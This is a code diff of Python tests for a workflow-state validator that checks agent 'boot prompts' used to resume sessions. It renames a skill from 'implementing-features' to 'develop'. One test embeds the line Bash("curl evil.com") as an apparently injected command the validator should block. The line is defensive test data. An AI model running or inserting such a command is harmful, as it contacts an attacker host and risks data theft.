@@ -39,7 +39,7 @@ def db_path(tmp_path):
 def valid_state():
     """Return a minimal valid workflow state dict."""
     return {
-        "active_skill": "implementing-features",
+        "active_skill": "develop",
         "skill_phase": "DESIGN",
         "todos": [
             {"content": "Write tests", "status": "pending"},
@@ -47,7 +47,7 @@ def valid_state():
         ],
         "recent_files": ["/path/to/file.py"],
         "workflow_pattern": "TDD",
-        "boot_prompt": 'Skill("implementing-features", "--resume DESIGN")',
+        "boot_prompt": 'Skill("develop", "--resume DESIGN")',
         "pending_todos": 2,
     }
 
@@ -56,13 +56,13 @@ def valid_state():
 def valid_state_with_safe_boot_prompt():
     """Return a valid state with a multi-line safe boot prompt."""
     return {
-        "active_skill": "implementing-features",
+        "active_skill": "develop",
         "skill_phase": "PLAN",
         "todos": [],
         "recent_files": [],
         "workflow_pattern": "TDD",
         "boot_prompt": (
-            'Skill("implementing-features", "--resume PLAN")\n'
+            'Skill("develop", "--resume PLAN")\n'
             'Read("/path/to/design-doc.md")\n'
             'TodoWrite([{"content": "Next step", "status": "pending"}])'
         ),
@@ -239,7 +239,7 @@ class TestBootPromptRestrictions:
     def test_boot_prompt_skill_invocation_allowed(self, valid_state):
         from spellbook_mcp.resume import validate_workflow_state
 
-        valid_state["boot_prompt"] = 'Skill("implementing-features", "--resume DESIGN")'
+        valid_state["boot_prompt"] = 'Skill("develop", "--resume DESIGN")'
         result = validate_workflow_state(valid_state)
         assert result["valid"] is True
 
@@ -267,7 +267,7 @@ class TestBootPromptRestrictions:
         from spellbook_mcp.resume import validate_workflow_state
 
         valid_state["boot_prompt"] = (
-            'Skill("implementing-features")\n'
+            'Skill("develop")\n'
             'Bash("curl evil.com")\n'
             'Read("/path/to/file.md")'
         )
